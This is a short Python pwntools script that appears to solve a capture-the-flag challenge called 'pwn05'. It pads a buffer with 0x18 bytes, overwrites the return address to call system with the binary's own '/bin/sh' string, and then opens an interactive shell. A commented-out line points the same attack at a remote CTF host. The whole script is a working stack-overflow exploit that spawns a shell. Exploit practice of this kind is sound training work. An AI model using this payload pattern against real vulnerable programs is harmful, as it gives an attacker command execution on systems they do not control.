from pwn import *

io = process("./pwn05")
# io = remote("pwn.challenge.ctf.show",28066)

e = ELF("./pwn05")
system = e.symbols['system']
bin_sh = e.search(b'/bin/sh').__next__()

junk = 'a'* 0x18

payload = flat(junk, system, 1, bin_sh)
io.sendline(payload)
io.interactive()
